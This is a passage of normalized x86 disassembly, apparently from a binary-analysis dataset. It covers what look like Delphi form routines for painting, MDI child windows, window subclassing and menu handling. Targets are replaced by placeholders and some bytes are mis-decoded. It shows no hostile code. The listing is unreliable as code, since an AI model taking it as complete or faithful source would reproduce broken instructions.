jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_456c1c
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_456734
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_456902
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41d618
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4413bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_43ca64
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_43b85c
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_4566a8
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_41d618
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_456bd0
test eax eax
je r-xdata
push ebp
call sub_4566a8
pop ecx
push ebp
call sub_4566a8
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_4566f4
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_453a14
jmp r-xdata
sub_456914
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_454bdc
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_456980
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_455278
mov eax ebx
call sub_443a0c
test al al
je r-xdata
mov eax ebx
call sub_41a050
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_443708
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_44052c
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_443708
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_41a024
call sub_450ed8
mov edx esi
mov eax ebx
call sub_41a024
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
sub_456a18
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_456a95
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_456aa0
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_440ca8
sub_456acc
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_440ca8
xor edx edx
jmp r-xdata
mov eax esi
call sub_454d58
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_456b04
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_43c724
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_440ca8
sub_456b48
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_43c830
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_456b9c
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_439dac
sub_456bd0
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_45a740
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_45a72c
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_456c1c
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_45a740
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45a72c
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_456c6c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_413de8
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_456c9c
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_443708
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_45a710
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_45a710
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_456c6c
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_45a710
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45a6fc
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_413f44
call sub_403258
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45a6fc
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45a6fc
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_45a6fc
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_456da0
push ebx
mov ebx eax
mov eax ebx
call sub_456d98
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_423928
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_456dc8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_440c60
mov dl 0x1
mov eax esi
call sub_45712c
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_4571a8
mov edx eax
mov eax esi
call sub_43d0c0
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_440dfc
mov dl 0x1
mov eax esi
call sub_45614c
sub_456e48
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_443708
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_44d4d4
mov edi eax
mov eax ebp
call sub_443708
push eax
call DrawMenuBar
sub_456ec4
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_419afc
xor edx edx
mov eax ebx
call sub_44ee6c
sub_456ee8
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_456e48
mov eax edx
mov edx ebx
call sub_419afc
sub_456f10
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4570d6
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_45a740
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_450a20
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45a72c
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_419afc
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45a72c
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_4039e4
mov eax ebx
call sub_443a0c
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_443708
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_456e48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4570dd
lea eax [ ebp - 0x10 ]
call sub_403fa8
retn
mov dl 0x1
mov eax ebx
call sub_457fd4
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_443a0c
test al al
je r-xdata
mov eax ebx
call sub_443a0c
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_443708
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_443708
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_443708
mov edx eax
mov eax esi
call sub_450a20
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_443708
push eax
call SetMenu
sub_4570f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4570e4
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_457154
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_457148
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_4571c0
push ebx
mov ebx eax
mov eax ebx
call sub_442d20
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_4571a8
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4571a8
mov edx eax
mov eax ebx
call sub_43d0c0
mov edx 0xff00000f
mov eax ebx
call sub_43d0c0
pop ebx
retn
sub_457244
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_443708
push eax
call ShowWindow
sub_457284
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_456c9c
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_456c9c
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_45a710
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_45a6fc
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_456c9c
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45a6fc
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_45a710
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_45a6fc
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_45a6fc
call sub_45a400
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45a6fc
call sub_45a3e4
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45a6fc
call sub_45a3cc
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_45a6fc
call sub_45a3cc
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45a6fc
call sub_45a3cc
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45a6fc
call sub_45a418
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_45a6fc
call sub_45a400
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45a6fc
call sub_45a3e4
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_45a6fc
call sub_45a3cc
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45a6fc
call sub_45a418
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_45a6fc
call sub_45a400
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_45a6fc
call sub_45a400
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_45a6fc
call sub_45a400
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45a6fc
call sub_45a3e4
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45a6fc
call sub_45a3cc
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45a6fc
call sub_45a418
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_45a6fc
call sub_45a3cc
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_45a6fc
call sub_45a418
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_45a6fc
call sub_45a400
push eax
mov edx esi
mov eax [ rw-data ]
call sub_45a6fc
call sub_45a3e4
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_4575d8
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_454b8c
mov edx esi
mov eax edi
call sub_459f7c
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_457687 ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_44052c
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_44052c
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax DefMDIChildProcA
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_4577e9
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_454b9c
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_443708
push eax
call SendMessageA
mov eax ebx
call sub_458148
push eax
push 0x1
push 0x80
mov eax ebx
call sub_443708
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_43c924
push eax
mov eax ebx
call sub_43c968
push eax
mov eax ebx
call sub_443708
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406a40
mov [ ebx + 0x254 ] eax
push ebx
push sub_456734
call sub_41aabc
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_44d4d4
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_443708
push eax
call SetWindowPos
jmp r-xdata
sub_457936
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_457a61
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_440890
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_4039e4
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_459e54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457a68
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
